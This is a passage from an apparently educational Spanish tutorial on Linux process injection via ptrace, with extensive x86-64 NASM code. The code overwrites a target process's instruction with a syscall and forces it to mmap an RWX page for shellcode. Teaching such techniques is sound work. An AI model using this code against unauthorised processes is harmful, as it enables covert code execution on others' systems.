</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w">   </span><span class="c1">; RDI se usa como puntero destino y va avanzando</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">27</span><span class="w">               </span><span class="c1">; RCX se usa como contador y se va decrementando hasta 0</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">    </span><span class="nf">cld</span><span class="w">                       </span><span class="c1">; DF=0 (dirección de copia ascendente)</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">    </span><span class="nf">rep</span><span class="w"> </span><span class="nv">movsq</span><span class="w">                 </span><span class="c1">; mueve RCX qwords: [RSI] -&gt; [RDI]</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">                    </span><span class="c1">; movsq copia un qword (8 bytes) desde la dirección apuntada por RSI hacia la dirección apuntada por RDI   </span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">                    </span><span class="c1">; rep repite esa operación RCX veces</span>
</span></code></pre></div>
<p>Con <code>PTRACE_GETREGS</code> (operación 12) <strong>obtenemos una instantánea completa de todos los registros del CPU del proceso <em>tracee</em> en el momento de su detención.</strong> Esta información se almacenará en el buffer siguiendo la arquitectura de <code>user_regs_struct</code>.</p>
<p>A continuación, se realiza una copia de respaldo de esta estructura en otro buffer. Este backup es crítico porque durante el proceso de inyección vamos a modificar los registros del <em>tracee</em> para ejecutar una syscall en su contexto. Sin esta copia, no podríamos restaurar el estado original del proceso después de la inyección.</p>
<h3 id="inyeccion-de-la-instruccion-syscall">Inyección de la Instrucción Syscall<a class="headerlink" href="#inyeccion-de-la-instruccion-syscall" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">; 3 Inyección de la instrucción syscall (0x0f 0x05)</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span><span class="w">   </span><span class="c1">; Contenido del RIP del proceso tracee (dirección de la próxima instrucción a ejecutar)</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="c1">; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la dirección actual a la que apunta el RIP del proceso tracee</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">       </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">       </span><span class="c1">; 8 bytes</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">     </span><span class="c1">; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">]</span><span class="w"> </span><span class="c1">; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w"> </span><span class="c1">; Backup del valor original</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="w">    </span><span class="nf">and</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFFFFFFFFFFFF0000</span><span class="w"> </span><span class="c1">; limpiar los 2 bytes bajos</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w">    </span><span class="nf">or</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x000000000000050F</span><span class="w">  </span><span class="c1">; insertar syscall (0x0f 0x05 en little-endian)</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Aquí es donde comienza la parte interesante. El primer objetivo es <strong>hacer que el proceso <em>tracee</em> ejecute una syscall en particular,</strong> concretamente <code>mmap</code>,  para reservar memoria ejecutable en el heap del proceso, este será el espacio que ocupará nuestro shellcode. Para ello, necesitamos que en la <strong>dirección a la que apunta el <code>RIP</code> del <em>tracee</em> exista una instrucción <code>syscall</code> (opcode <code>0x0F 0x05</code>).</strong></p>
<p>El proceso es el siguiente:</p>
<ol>
<li>Se extrae la dirección actual a la que apunta el registro <code>RIP</code> del <em>tracee</em> desde el buffer de registros (<code>regs+0x80</code>). Esta es la dirección de la próxima instrucción que el <em>tracee</em> iba a ejecutar antes de ser detenido.</li>
<li>Con <code>PTRACE_PEEKDATA</code> (operación 2) se leen los 8 bytes que hay en esa dirección de memoria del <em>tracee</em>. Estos bytes son instrucciones que el <em>tracee</em> estaba a punto de ejecutar.</li>
<li>Se guarda una copia del valor original (lo necesitaremos después para restaurar). Luego se modifican solo los 2 bytes menos significativos del valor leído, reemplazándolos por <code>0x0F 0x05</code> (el opcode de la instrucción <code>syscall</code> en x86-64). La máscara <code>AND 0xFFFFFFFFFFFF0000</code> limpia los 2 bytes bajos y el <code>OR 0x050F</code> inserta el opcode en little-endian.</li>
<li>Con <code>PTRACE_POKEDATA</code> (operación 5) se escribe el valor modificado de vuelta en la memoria del <em>tracee</em>, sobreescribiendo temporalmente las instrucciones originales con una instrucción <code>syscall</code>.</li>
</ol>
<h3 id="configuracion-de-registros-para-mmap">Configuración de Registros para <code>MMAP</code><a class="headerlink" href="#configuracion-de-registros-para-mmap" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">; 4 Configuración de registros para MMAP</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="c1">; MMAP</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x50</span><span class="p">],</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; (RAX) Se sustituye todo el valor del registro       Número de syscall para mmap</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x70</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (RDI)       rdi = addr = 0 (NULL) → Pide al kernel que elija la dirección</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x68</span><span class="p">],</span><span class="mi">4096</span><span class="w">     </span><span class="c1">; (RSI)       rsi = length = 4096 bytes (1 página típica)</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x60</span><span class="p">],</span><span class="mi">7</span><span class="w">        </span><span class="c1">; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="mi">34</span><span class="w">       </span><span class="c1">; (R10)       r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x48</span><span class="p">],</span><span class="o">-</span><span class="mi">1</span><span class="w">       </span><span class="c1">; (R8)        r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica &quot;no file&quot;)</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x40</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Ahora que tenemos una instrucción <code>syscall</code> lista en el punto de ejecución del <em>tracee</em>, necesitamos <strong>configurar sus registros</strong> para que esa syscall ejecute exactamente lo que queremos, una <strong>llamada a <code>mmap</code> que reserve una página de memoria con permisos de lectura, escritura y ejecución (RWX)</strong>.</p>
<p>Los registros se modifican directamente en nuestro buffer usando los offsets correspondientes y luego se aplican los cambios en el <em>tracee</em> con <code>PTRACE_SETREGS</code>:</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nf">rax</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mi">9</span><span class="w">          </span><span class="c1">; número de syscall (mmap)</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nf">rdi</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="nv">addr</span><span class="w">       </span><span class="c1">; dirección sugerida (0 = el kernel elige)</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nf">rsi</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="nv">length</span><span class="w">     </span><span class="c1">; tamaño del mapeo en bytes</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nf">rdx</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="nv">prot</span><span class="w">       </span><span class="c1">; protecciones: PROT_READ|PROT_WRITE|PROT_EXEC...</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nf">r10</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="nv">flags</span><span class="w">      </span><span class="c1">; MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED...</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nf">r8</span><span class="w">  </span><span class="err">=</span><span class="w"> </span><span class="nv">fd</span><span class="w">         </span><span class="c1">; descriptor (si MAP_ANONYMOUS, típicamente -1)</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nf">r9</span><span class="w">  </span><span class="err">=</span><span class="w"> </span><span class="nv">offset</span><span class="w">     </span><span class="c1">; offset en el fichero (en bytes, múltiplo de página)</span>
</span></code></pre></div>
<p>La combinación <code>MAP_PRIVATE | MAP_ANONYMOUS</code> indica al kernel que cree una región de memoria privada, no respaldada por ningún archivo en disco. Los <strong>permisos</strong> <strong>RWX</strong> son necesarios porque vamos a <strong>escribir</strong> el shellcode en esta región y luego <strong>ejecutarlo</strong>.</p>
<h3 id="ejecucion-controlada-de-la-syscall-mmap">Ejecución Controlada de la Syscall <code>MMAP</code><a class="headerlink" href="#ejecucion-controlada-de-la-syscall-mmap" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">; 5 Ejecución controlada de la syscall MMAP</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="c1">;PTRACE_SINGLESTEP</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">     </span><span class="c1">; data</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_sys</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="w">  </span><span class="c1">; 6 Obtención del resultado de la syscall MMAP</span>
</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w"> </span>
</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_sys</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span><span class="w">       </span><span class="c1">; (RAX) dirección donde comienza la zona de memoria reservada com permisos RWX</span>
</span></code></pre></div>
<p>Con los registros del <em>tracee</em> configurados y la instrucción <code>syscall</code> en su lugar, usamos <code>PTRACE_SINGLESTEP</code> (operación 9) para ejecutar exactamente una instrucción en el contexto del <em>tracee</em>. Esa instrucción es el <code>syscall</code> que inyectamos en el paso 3, que con los registros modificados del paso 4, ejecutará <code>mmap</code>.</p>
<p>Posteriormente, usamos <code>PTRACE_GETREGS</code> para obtener el estado de los registros después de la ejecución de la syscall. El valor de retorno de <code>mmap</code> quedará almacenado en el registro <code>RAX</code> del tracee. Este valor es la <strong>dirección base de la nueva región de memoria con permisos RWX</strong> que el kernel ha asignado dentro del espacio de direcciones del proceso objetivo.</p>
<blockquote>
<p>El motivo de usar un buffer diferente es simple, <code>regs</code> ya fue modificado en el paso 4 (los registros para el <code>mmap</code>) y <code>regs_ori</code> contiene los registros originales que necesitamos preservar intactos. <code>regs_sys</code> nos permite capturar el resultado de <code>mmap</code> sin contaminar ninguno de los dos.
</p>
</blockquote>
<h3 id="restauracion-del-contenido-en-la-direccion-apuntada-por-rip">Restauración del Contenido en la Dirección Apuntada por <code>RIP</code><a class="headerlink" href="#restauracion-del-contenido-en-la-direccion-apuntada-por-rip" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">; 7 Restauración del contenido ubicado en la dirección a la que apunta el registro RIP del tracee</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
